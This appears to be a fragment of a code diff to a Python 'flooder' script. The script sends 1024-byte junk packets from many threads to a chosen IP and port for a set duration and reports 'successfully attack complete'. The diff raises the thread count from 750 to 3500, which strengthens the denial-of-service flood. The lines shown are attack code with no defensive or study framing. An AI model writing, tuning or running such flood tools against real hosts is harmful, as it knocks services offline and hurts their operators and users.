@@ -14,7 +14,7 @@ print(f"Start flooder to {ip}:{port} for {duration} s")
 
 stop_time = time.time() + duration
 packet = b"A" * 1024
-threads = 750
+threads = 3500
 
 def worker():
     while time.time() < stop_time:
@@ -34,3 +34,4 @@ for t in tlist:
 
 print("successfully attack complete")
 sock.close()
+
